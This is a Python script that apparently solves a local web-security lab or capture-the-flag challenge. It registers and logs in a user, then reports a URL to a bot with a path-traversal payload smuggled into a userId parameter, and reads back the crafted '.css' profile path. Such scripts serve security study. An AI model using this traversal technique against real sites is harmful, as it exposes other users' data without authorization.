import requests

base_url = "http://localhost:1337"
auth_token = ""

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}

def register(username, email, password):
    url = f"{base_url}/api/register"
    data = {
        "username": username,
        "email": email,
        "password": password
    }
    response = requests.post(url, json=data)
    print(f'Registration response: {response.status_code}')
    return response.json()
def login(username, password):
    url = f"{base_url}/api/login"
    data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, json=data)
    global auth_token
    auth_token = response.json().get("auth_token", "")
    print(f'Login response: {response.status_code}, Auth Token: {auth_token}')
    return response.json()

def get_profile(user_id):
    url = f"{base_url}/api/profile/{user_id}"

    response = requests.get(url)
    return response.json()

def report_url(auth_token, url_to_report):
    url = f"{base_url}/api/report"
    headers = {
        "X-Auth-Token": f"{auth_token}"
    }
    data = {
        "url": url_to_report
    }
    response = requests.post(url, json=data, headers=headers, proxies=proxies)
    print(f'Report URL response: {response.status_code}')
    return response.json()

import uuid

username = "asdf1234"+str(uuid.uuid4())
email = 'email'+str(uuid.uuid4())+'@gmail.com'
password = "password123"
register(username, email, password)

login_response = login(username, password)

report_url(auth_token, f"http://localhost/profile?userId=../../../../../../api/profile/asdf_{username}.css")

res = get_profile(f"asdf_{username}.css")
print(res)